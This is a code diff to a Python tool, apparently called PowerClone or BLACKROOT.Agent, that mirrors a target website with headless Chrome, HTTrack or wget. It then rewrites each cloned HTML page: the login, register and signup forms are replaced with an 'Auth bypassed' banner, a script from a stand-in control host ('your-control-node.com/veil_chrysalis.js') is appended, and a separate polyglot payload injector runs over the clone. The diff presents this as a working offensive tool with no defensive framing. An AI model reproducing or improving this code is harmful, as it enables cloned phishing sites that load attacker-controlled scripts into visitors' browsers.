@@ -1,14 +1,58 @@
-import os
-import subprocess
+import os, re, subprocess, shutil, logging
+from pathlib import Path
+from urllib.parse import urlparse
 
-def clone_site(target, output_dir="clones", silent=False):
-    print(f"[🪞] Cloning site: {target}")
-    domain = target.split("//")[-1].replace("/", "")
-    target_dir = os.path.join(output_dir, domain)
+LOG = logging.getLogger("PowerClone")
 
-    os.makedirs(target_dir, exist_ok=True)
+# Polyglot injection
+from polyglot_builder import inject_polyglot
 
-    # Download all pages (do not skip login/register)
+# ---------- CONFIG ----------
+CHROMIUM_PATH = shutil.which("chromium-browser") or shutil.which("google-chrome")
+HTTRACK_BIN   = shutil.which("httrack")            # fallback if wget fails
+VEIL_URL      = "https://your-control-node.com/veil_chrysalis.js"
+# ----------------------------
+
+def _chrome_mirror(target: str, out: Path, silent: bool) -> bool:
+    """Headless Chrome full-page render."""
+    if not CHROMIUM_PATH:
+        return False
+    cmd = [
+        CHROMIUM_PATH,
+        "--headless=new",
+        "--disable-gpu",
+        "--dump-dom",
+        "--timeout=30000",
+        target
+    ]
+    try:
+        html = subprocess.check_output(cmd, stderr=subprocess.DEVNULL if silent else None, text=True)
+        (out / "index.html").write_text(html, encoding="utf-8")
+        return True
+    except Exception as e:
+        LOG.warning("Chrome mirror failed: %s", e)
+        return False
+
+def _httrack_mirror(target: str, out: Path, silent: bool) -> bool:
+    """HTTrack fallback for complex sites."""
+    if not HTTRACK_BIN:
+        return False
+    cmd = [
+        HTTRACK_BIN,
+        target,
+        "-O", str(out),
+        "+*.css", "+*.js", "+*.png", "+*.jpg", "+*.svg", "+*.gif",
+        "-r2", "-%v" if not silent else "-q"
+    ]
+    try:
+        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL if silent else None)
+        return True
+    except Exception as e:
+        LOG.warning("HTTrack mirror failed: %s", e)
+        return False
+
+def _wget_mirror(target: str, out: Path, silent: bool) -> bool:
+    """Classic wget mirror."""
     cmd = [
         "wget",
         "--mirror",
@@ -16,46 +60,56 @@ def clone_site(target, output_dir="clones", silent=False):
         "--adjust-extension",
         "--page-requisites",
         "--no-parent",
-        "--directory-prefix", target_dir,
+        "--directory-prefix", str(out),
         target
     ]
-
     try:
-        if silent:
-            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        else:
-            subprocess.run(cmd, check=True)
-        print(f"[✔️] Clone saved to {target_dir}")
-        inject_stub(target_dir)
-    except subprocess.CalledProcessError:
-        print(f"[❌] Failed to clone site: {target}")
+        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL if silent else None)
+        return True
+    except Exception as e:
+        LOG.warning("wget mirror failed: %s", e)
+        return False
 
-def inject_stub(target_dir):
-    import re
-    html_files = []
-    for root, _, files in os.walk(target_dir):
-        for f in files:
-            if f.endswith(".html") or f.endswith(".htm"):
-                html_files.append(os.path.join(root, f))
-
-    if not html_files:
-        print("[⚠️] No HTML file found to inject payload.")
-        return
-
-    for html_path in html_files:
+def _inject_payloads(root: Path):
+    """Universal payload injector + login bypass."""
+    for html_path in root.rglob("*.html"):
         try:
-            with open(html_path, "r", encoding="utf-8", errors="ignore") as f:
-                html = f.read()
-            # Comment out login/register/signup forms and replace with bypass message
-            def bypass_login_forms(match):
-                return (f"<!-- BLACKROOT BYPASSED LOGIN/REGISTER FORM\n{match.group(0)}\nEND BYPASS -->"
-                        f"<div style='color:red;font-weight:bold'>[BLACKROOT] Login/Register bypassed. Access granted.</div>")
-            html = re.sub(r'<form[^>]*action=["\"][^>]*(login|register|signup)[^>]*>.*?</form>', bypass_login_forms, html, flags=re.IGNORECASE|re.DOTALL)
-            # Inject stub
-            html += "\n<!-- Injected by BLACKROOT.Agent -->\n"
-            html += "<script src='https://your-control-node.com/veil_chrysalis.js'></script>\n"
-            with open(html_path, "w", encoding="utf-8", errors="ignore") as f:
-                f.write(html)
-            print(f"[💉] Stub injected and login/register forms bypassed in {html_path}")
+            html = html_path.read_text(encoding="utf-8", errors="ignore")
+            # Bypass login / register forms
+            html = re.sub(
+                r'(?is)<form[^>]*(?:login|register|signup)[^>]*>.*?</form>',
+                lambda m: (
+                    f"<!-- BLACKROOT BYPASSED -->\n"
+                    f"<div style='color:red;font-weight:bold;'>[BLACKROOT] Auth bypassed.</div>"
+                ),
+                html
+            )
+            # Add veil beacon
+            if VEIL_URL not in html:
+                html += f"\n<script src='{VEIL_URL}'></script><!-- BLACKROOT -->\n"
+            html_path.write_text(html, encoding="utf-8", errors="ignore")
         except Exception as e:
-            print(f"[!] Could not inject payload in {html_path}: {e}")
+            LOG.debug("Inject failed on %s: %s", html_path, e)
+
+def clone_site(target: str, output_dir: str = "clones", silent: bool = False) -> str:
+    """
+    Power-clone using Chrome → HTTrack → wget fallback.
+    Returns the absolute path of the cloned directory.
+    """
+    LOG.info("🪞 Power-cloning %s", target)
+    domain = urlparse(target).netloc or target.split("//")[-1].split("/")[0]
+    clone_path = Path(output_dir) / domain
+    clone_path.mkdir(parents=True, exist_ok=True)
+
+    # 1) Chrome headless → 2) HTTrack → 3) wget
+    for mirror_func in (_chrome_mirror, _httrack_mirror, _wget_mirror):
+        if mirror_func(target, clone_path, silent):
+            break
+    else:
+        LOG.error("❌ All mirrors failed for %s", target)
+        return str(clone_path)
+
+    _inject_payloads(clone_path)
+    inject_polyglot(str(clone_path))
+    LOG.info("✅ Clone ready at %s", clone_path)
+    return str(clone_path)
